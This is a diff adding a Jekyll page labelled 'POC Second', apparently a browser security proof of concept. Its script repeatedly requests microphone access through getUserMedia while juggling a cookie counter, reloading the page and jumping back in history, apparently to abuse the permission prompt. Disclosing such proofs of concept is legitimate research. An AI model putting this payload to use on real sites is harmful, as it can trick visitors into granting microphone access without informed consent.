@@ -1,0 +1,80 @@
+---
+layout: page
+title: POC Second
+permalink: /poc/second.html
+image: '/images/01.jpg'
+---
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <link href="style.css" rel="stylesheet" />
+</head>
+<body>
+
+  <script>
+targetId = null
+var permission = null;
+var loadCount = null;
+
+
+window.onload = function () {
+    setTimeout("attempt()", 1000);
+}
+
+function attempt() {
+    var url = new URL(window.location.href);
+    permission = "microphone";
+
+    var cookies = document.cookie;
+    var cookiesArray = cookies.split(';');
+
+    for(var c of cookiesArray){
+        var cArray = c.split('=');
+        if( cArray[0] == 'load'){
+            console.log(cArray);
+        }
+    }
+
+    loadCount = Number(cArray[1])
+
+    if(loadCount == 0){
+        document.cookie = "load=" + String(loadCount + 1);
+        requestPermission();
+        setTimeout("go()", 3000);
+    }else{
+        requestPermission();
+        setTimeout("back()", 300);
+    }
+
+}
+
+function go() {
+    var nextUrl = location.href.replace(/\#.*$/, '').replace(/\?.*$/, '');
+    window.location = nextUrl + "?" + "loadCount=" + String(loadCount + 1);
+}
+
+function back(){
+    history.go(-1);
+}
+
+function requestPermission() {
+    permissionMicrophone();
+}
+
+
+function permissionMicrophone() {
+    targetId = "Microphone";
+    var constraints = { audio: true };
+    navigator.mediaDevices.getUserMedia(constraints)
+        .then(function (stream) {
+        })
+        .catch(function (err) {
+        });
+}
+
+  </script>
+</body>
+</html>
